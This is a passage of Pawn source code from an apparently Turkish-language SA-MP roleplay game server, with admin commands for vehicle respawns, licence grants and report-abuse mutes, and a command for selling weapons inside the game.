		    if(LSPDVehicles[v] > 0 && IsVehicleOccupied(LSPDVehicles[v]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(LSPDVehicles[v]);
		}

		SendClientMessage(playerid, COLOR_WHITE, "LSPD'nin tüm boþ araçlarý yeniden çýkarýldý.");
	} else if(PlayerInfo[playerid][pFaction] == 2 && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pLeader] == 2) {
		for(new v = 0; v < sizeof(FBIVehicles); v++) {
		    if(FBIVehicles[v] > 0 && IsVehicleOccupied(FBIVehicles[v]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(FBIVehicles[v]);
		}

		SendClientMessage(playerid, COLOR_WHITE, "FBI'ýn tüm boþ araçlarý yeniden çýkarýldý.");
	} else if(PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pLeader] == 3) {
		for(new v = 0; v < sizeof(LSFMDVehicles); v++) {
		    if(LSFMDVehicles[v] > 0 && IsVehicleOccupied(LSFMDVehicles[v]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(LSFMDVehicles[v]);
		}

		SendClientMessage(playerid, COLOR_WHITE, "LSFMD'nin tüm boþ araçlarý yeniden çýkarýldý.");
	} else if(PlayerInfo[playerid][pFaction] == 6 && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pLeader] == 6) {
		for(new v = 0; v < sizeof(TAXIVehicles); v++) {
		    if(TAXIVehicles[v] > 0 && IsVehicleOccupied(TAXIVehicles[v]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(TAXIVehicles[v]);
		}
		SendClientMessage(playerid, COLOR_WHITE, "LST'nin tüm boþ araçlarý yeniden çýkarýldý.");
	} else if(PlayerInfo[playerid][pFaction] == 9 && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pLeader] == 9) {
		for(new v = 0; v < sizeof(SANVehicles); v++) {
		    if(SANVehicles[v] > 0 && IsVehicleOccupied(SANVehicles[v]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(SANVehicles[v]);
		}
		SendClientMessage(playerid, COLOR_WHITE, "San News'in tüm boþ araçlarý yeniden çýkarýldý.");
	} else if(PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pLeader] == 5) {
		for(new v = 0; v < sizeof(GovVehicles); v++) {
		    if(GovVehicles[v] > 0 && IsVehicleOccupied(GovVehicles[v]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(GovVehicles[v]);
		}


		SendClientMessage(playerid, COLOR_WHITE, "Devlet'in tüm boþ araçlarý yeniden çýkarýldý.");
	} else return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanmaya yetkin yok. (ya da kuruluþunda yeniden çýkarýlabilecek araç yok).");
	return 1;
}


CMD:givelicense(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin]>=6)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid, type;
		if(sscanf(params, "ud", giveplayerid, type))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /givelicense [Oyuncu ID/Ýsim] [type]");
			SendClientMessage(playerid, COLOR_GRAD2, "Tip: 1 = Sürücü, 2 = Tekne, 3 = Uçuþ.");
			return 1;
		}

		if(!IsPlayerConnected(giveplayerid))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
			return 1;
		}

		switch(type)
		{
		case 1:
			{
				if(PlayerInfo[giveplayerid][pCarLic] == 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncunun zaten sürücü belgesi var.");
					return 1;
				}
				format(string, sizeof(string), "%s kiþisine sürücü belgesi verdin.",GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s sana sürücü belgesi verdi.",GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s, %s kiþisine sürücü belgesi verdi.",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid));
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pCarLic] = 1;
				return 1;
			}
		case 2:
			{
				if(PlayerInfo[giveplayerid][pBoatLic] == 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncunun zaten tekne belgesi var.");
					return 1;
				}
				format(string, sizeof(string), "%s kiþisine tekne belgesi verdin.",GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s sana tekne belgesi verdi.",GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s, %s kiþisine tekne belgesi verdi.",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid));
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pBoatLic] = 1;
				return 1;
			}
		case 3:
			{
				if(PlayerInfo[giveplayerid][pFlyLic] == 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncunun zaten pilot belgesi var.");
					return 1;
				}
				format(string, sizeof(string), "%s kiþisine pilot belgesi verdin.",GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s sana pilot belgesi verdi.",GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s, %s kiþisine pilot belgesi verdi.",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid));
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pFlyLic] = 1;
				return 1;
			}
		default:
			{
				SendClientMessage(playerid, COLOR_WHITE, "Geçersiz lisans tipi! /lisansver [Oyuncu ID/Ýsim] [type]");
				SendClientMessage(playerid, COLOR_GRAD2, "Tip: 1 = Sürücü, 2 = Tekne, 3 = Uçuþ.");
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanmaya yetkin yok.");
	return 1;
}

CMD:rto(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
	    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[512], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /rto [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pRMuted] == 0)
			{
			    if(PlayerInfo[giveplayerid][pRMutedTotal] == 0)
			    {
  					PlayerInfo[giveplayerid][pRMutedTotal] = 1;
					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisine raporu kötüye kullanmaktan ilk uyarýsýný verdi, sebep: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "Admin /rapor kýsmýný kötüye kullanmaktan seni uyardý.\n\nBir sonraki /rapor kötüye kullanýmý /rapor kýsmýndan mute yemene veya bu özelliði tamamen kullanamamana yol açacak.");
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Rapor kötüye kullanýmý uyarýsý", string,"Ileri", "");

					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisine raporu kötüye kullanmaktan ilk uyarýsýný verdi, sebep: %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					Log("logs/mute.log", string);

			    }
			    else if(PlayerInfo[giveplayerid][pRMutedTotal] == 1)
			    {
  					PlayerInfo[giveplayerid][pRMuted] = 2;
  					PlayerInfo[giveplayerid][pRMutedTotal] = 2;
					PlayerInfo[giveplayerid][pRMutedTime] = 15*60;
					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinin rapor göndermesini blokladý, sebep: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "%s tarafýndan rapor göndermen bloklandý, sebep: %s.\n\nRapordan dolayý bu ikinci bloklanman, 15 dakika boyunca /rapor kullanamayacaksýn.\n\nBir daha /rapor un kötüye kullanýmý daha uzun süre mute yemene sebep olacaktýr.", GetPlayerNameEx(playerid), reason);
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Rapordan geçici olarak bloklandý", string,"Ileri", "");

					format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan /rapor kullanýmý geçici olarak bloklandý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
					Log("logs/mute.log", string);
			    }
			    else if(PlayerInfo[giveplayerid][pRMutedTotal] == 2)
			    {
  					PlayerInfo[giveplayerid][pRMuted] = 2;
  					PlayerInfo[giveplayerid][pRMutedTotal] = 3;
					PlayerInfo[giveplayerid][pRMutedTime] = 30*60;
					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisini rapor göndermekten blokladý, sebep: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "Rapor göndermekten %s tarafýndan geçici olarak bloklandýn, sebep: %s.\n\nBu üçüncü defa rapor göndermekten bloklanýþýn, 30 dakika boyunca /rapor kullanamayacaksýn.\n\nBir daha /rapor un kötüye kullanýmý daha uzun süre mute yemene sebep olacaktýr.", GetPlayerNameEx(playerid), reason);
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Rapordan geçici olarak bloklandý", string,"Ileri", "");

					format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan /rapor kullanýmý geçici olarak bloklandý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
					Log("logs/mute.log", string);
			    }
			    else if(PlayerInfo[giveplayerid][pRMutedTotal] == 3)
			    {
  					PlayerInfo[giveplayerid][pRMuted] = 2;
  					PlayerInfo[giveplayerid][pRMutedTotal] = 4;
					PlayerInfo[giveplayerid][pRMutedTime] = 45*60;
					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisini rapor göndermekten blokladý, sebep: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "Rapor göndermekten %s tarafýndan geçici olarak bloklandýn, sebep: %s.\n\nBu dördüncü defa rapor göndermekten bloklanýþýn, 45 dakika boyunca /rapor kullanamayacaksýn.\n\nBir daha /rapor un kötüye kullanýmý daha uzun süre mute yemene sebep olacaktýr.", GetPlayerNameEx(playerid), reason);
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Rapordan geçici olarak bloklandý", string,"Ileri", "");

					format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan /rapor kullanýmý geçici olarak bloklandý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
					Log("logs/mute.log", string);
				}
			    else if(PlayerInfo[giveplayerid][pRMutedTotal] == 4)
			    {
  					PlayerInfo[giveplayerid][pRMuted] = 2;
  					PlayerInfo[giveplayerid][pRMutedTotal] = 5;
					PlayerInfo[giveplayerid][pRMutedTime] = 60*60;
					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisini rapor göndermekten blokladý, sebep: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "Rapor göndermekten %s tarafýndan geçici olarak bloklandýn, sebep: %s.\n\nBu beþinci defa rapor göndermekten bloklanýþýn, 60 dakika boyunca /rapor kullanamayacaksýn.\n\nBir daha /rapor un kötüye kullanýmý daha uzun süre mute yemene sebep olacaktýr.", GetPlayerNameEx(playerid), reason);
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Rapordan geçici olarak bloklandý", string,"Ileri", "");

					format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan /rapor kullanýmý geçici olarak bloklandý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
					Log("logs/mute.log", string);
				}
			    else if(PlayerInfo[giveplayerid][pRMutedTotal] >= 5)
			    {
  					PlayerInfo[giveplayerid][pRMuted] = 2;
  					PlayerInfo[giveplayerid][pRMutedTotal] = 6;
					PlayerInfo[giveplayerid][pRMutedTime] = 300*60;
					format(string, sizeof(string), "AdminKomutu: %s, %s kiþisini rapor göndermekten blokladý, sebep: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "Rapor göndermekten %s tarafýndan geçici olarak bloklandýn, sebep: %s.\n\nBu altýncý defa rapor göndermekten bloklanýþýn, 5 saat boyunca /rapor kullanamayacaksýn.\n\nBir daha /rapor un kötüye kullanýmý daha uzun süre mute yemene sebep olacaktýr.", GetPlayerNameEx(playerid), reason);
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Rapordan geçici olarak bloklandý", string,"Ileri", "");

					format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan /rapor kullanýmý geçici olarak bloklandý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
					Log("logs/mute.log", string);
				}

				for(new i = 0; i < MAX_REPORTS; i++)
				{
					if(Reports[i][ReportFrom] == giveplayerid)
					{
						Reports[i][BeingUsed] = 0;
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu zaten /rapor kullanamýyor.");
			}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:rtoreset(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /rtoreset [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pRMuted] == 2)
			{
				PlayerInfo[giveplayerid][pRMuted] = 0;
				PlayerInfo[giveplayerid][pRMutedTotal]--;
				PlayerInfo[giveplayerid][pRMutedTime] = 0;
				format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinin rapor bloklamasýný kaldýrdý, sebep: %s",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid), reason);
				ABroadCast(COLOR_LIGHTRED,string,1);
				SendClientMessage(giveplayerid, COLOR_GRAD2, "Rapor bloklaman kaldýrýldý. Artýk rapor sistemini kullanabilirsin.");
				SendClientMessage(giveplayerid, COLOR_GRAD2, "Yapýlan hata ve yanlýþlýk için özür dileriz.");
				format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan rapor bloklamasý kaldýrýldý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				Log("logs/mute.log", string);
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Bu oyuncu rapordan blok yememiþ!");
			}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:rmute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /rmute [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pRMuted] == 0)
			{
				PlayerInfo[giveplayerid][pRMuted] = 1;
				format(string, sizeof(string), "AdminKomutu: %s, %s kiþisini süresiz olarak rapordan blokladý.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ABroadCast(COLOR_LIGHTRED,string,1);
				format(string, sizeof(string), "%s tarafýndan /rapor kullanýmýn bloklandý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_GRAD2, string);
				SendClientMessage(giveplayerid, COLOR_GRAD2, "Blok kaldýrýlana kadar rapor gönderemeyeceksin. Temyiz için "WEBSITE);
				format(string, sizeof(string), "AdminKomutu: %s kiþisinin /rapor kullanýmý, %s tarafýndan bloklandý", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				Log("logs/mute.log", string);
			}
			else
			{
				PlayerInfo[giveplayerid][pRMuted] = 0;
				PlayerInfo[giveplayerid][pRMutedTime] = 0;
				format(string, sizeof(string), "AdminKomutu: %s kiþisinin rapor kullanýmý, %s tarafýndan tekrar açýldý",GetPlayerNameEx(giveplayerid),GetPlayerNameEx(playerid));
				ABroadCast(COLOR_LIGHTRED,string,1);
				format(string, sizeof(string), "%s tarafýndan /rapor kullanýmýn tekrar açýldý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_GRAD2, string);
				format(string, sizeof(string), "AdminKomutu: %s kiþisinin rapor bloklamasý, %s tarafýndan kaldýrýldý", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				Log("logs/mute.log", string);
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:silahsat(playerid, params[])
{
    new string[128];
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}
    if(GetPVarInt(playerid, "PBM") > 0) {
        SendClientMessage(playerid,COLOR_GREY,"Arenadayken bunu yapamazsýn!");
        return 1;
    }
   	if(GetPVarInt(playerid, "EventToken") == 1) {
		SendClientMessage(playerid, COLOR_WHITE, "Etkinlikteyken bu komutu kullanamazsýn.");
		return 1;
	}
    if(PlayerInfo[playerid][pJob] != 9 && PlayerInfo[playerid][pJob2] != 9) {
        SendClientMessage(playerid,COLOR_GREY,"Silah Satýcýsý deðilsin!");
        return 1;
    }
    if(PlayerInfo[playerid][pScrewdriver] == 0) {
        SendClientMessage(playerid,COLOR_GREY,"Silah yapabilmek için zanaatkardan tornavidaya ihtiyacýn var!");
        return 1;
    }
    if(PlayerInfo[playerid][pJailTime] > 0) {
        SendClientMessage(playerid,COLOR_GREY,"Hapisteyken silah yapamazsýn!");
        return 1;
    }
   	if(PlayerBoxing[playerid] == 1)
  	{
   		SendClientMessage(playerid, COLOR_GREY, "Boks yaparken silah yapabilirsin.");
     	return 1;
   	}
    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Araçtayken silah satamazsýn.");

    if(GetPVarInt(playerid, "ArmsTimer") > 0) {
        format(string, sizeof(string), "   Baþka silah satmadan önce %d saniye beklemelisin.", GetPVarInt(playerid, "ArmsTimer"));
        SendClientMessage(playerid,COLOR_GREY,string);
        return 1;
    }
    if(GetPVarInt(playerid, "Hospital") == 1 || GetPVarInt(playerid, "Hospital") == 2 || GetPVarInt(playerid, "Hospital") == 3 || GetPVarInt(playerid, "Hospital") == 4 || GetPVarInt(playerid, "Hospital") == 5) {
        SendClientMessage(playerid, COLOR_GREY, "Hastanedeyken silah çýkaramazsýn.");
        return 1;
    }
    new giveplayerid,x_weapon[20],weapon,price;
    if(sscanf(params, "us[20]", giveplayerid, x_weapon)) {
        SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
        SendClientMessage(playerid, COLOR_YELLOW, "<< Kullanýlabilir Silahlar >>");
        new level = PlayerInfo[playerid][pArmsSkill];
        if(level >= 0 && level < 50) {
            SendClientMessage(playerid, COLOR_GRAD1, "sdpistol(1500)	Flowers(Buglu)(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "shotgun(2450)	 knuckles(75)");
        }
        else if(level >= 50 && level < 100) {
            SendClientMessage(playerid, COLOR_GRAD1, "sdpistol(1500)	Flowers(Buglu)(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "shotgun(2450)	 knuckles(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "mp5(3750)		 baseballbat(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "rifle(4500)	  cane(75)");
        }
        else if(level >= 100 && level < 200) {
            SendClientMessage(playerid, COLOR_GRAD1, "sdpistol(1500)	Flowers(Buglu)(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "shotgun(2450)	 knuckles(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "mp5(3750)		 baseballbat(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "rifle(4500)	  cane(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "deagle(15000)	 shovel(75)");
        }
        else if(level >= 200 && level < 400) {
            SendClientMessage(playerid, COLOR_GRAD1, "sdpistol(1500)	Flowers(Buglu)(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "shotgun(2450)	 knuckles(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "mp5(3750)		 baseballbat(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "rifle(4500)	  cane(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "deagle(15000)	 shovel(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "ak47(21000)	   poolcue(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "m4(21000)		 golfclub(75)");
        }
        else if(level >= 400) {
            SendClientMessage(playerid, COLOR_GRAD1, "sdpistol(1500)	Flowers(Buglu)(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "shotgun(2450)	 knuckles(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "mp5(3750)		 baseballbat(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "rifle(4500)	  cane(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "deagle(15000)	 shovel(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "ak47(21000)	   poolcue(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "m4(21000)		 golfclub(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "spas12(40500)	 dildo(75)");
            SendClientMessage(playerid, COLOR_GRAD1, "sniper(40500)	 katana(75)");
        }
        SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
        SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /silahsat [Oyuncu ID/Ýsim] [weaponname]");
        return 1;
    }
   	if(giveplayerid == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Oyunda olmayan kullanýcýya silah veremezsin.");

	if(PlayerInfo[giveplayerid][pJailTime] > 0 || PlayerCuffed[giveplayerid] > 0)
        return SendClientMessage(playerid,COLOR_GREY,"Hapisteki veya kelepçeli oyuncuya silah veremezsin!");

    if(strcmp(x_weapon,"dildo",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 400) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 74) {
            weapon = 10; price = 75;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"katana",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 400) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 74) {
            weapon = 8; price = 75;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"golfclub",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 200) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 74) {
            weapon = 2; price = 75;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"poolcue",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 200) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 74) {
            weapon = 7; price = 75;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"shovel",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 100) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 74) {
            weapon = 6; price = 75;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"cane",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 50) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 74) {
            weapon = 15; price = 75;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"baseballbat",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 50) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 74) {
            weapon = 5; price = 75;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"knuckles",true) == 0) {
        if(PlayerInfo[playerid][pMats] > 74) {
            weapon = 1; price = 75;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"sdpistol",true) == 0) {
        if(PlayerInfo[playerid][pMats] > 1499) {
            weapon = 23; price = 1500;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }


    else if(strcmp(x_weapon,"deagle",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 100) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 14999) {
            weapon = 24; price = 15000;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"mp5",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 50) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 3749) {
            weapon = 29; price = 3750;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"shotgun",true) == 0) {
        if(PlayerInfo[playerid][pMats] > 2449) {
            weapon = 25; price = 2450;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"9mm",true) == 0) {
        if(PlayerInfo[playerid][pMats] > 149) {
            weapon = 22; price = 150;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"spas12",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 400) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 40499) {
            weapon = 27; price = 40500;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"sniper",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 400) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 40499) {
            weapon = 34; price = 40500;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"ak47",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 200) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 20999) {
            weapon = 30; price = 21000;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"m4",true) == 0) {
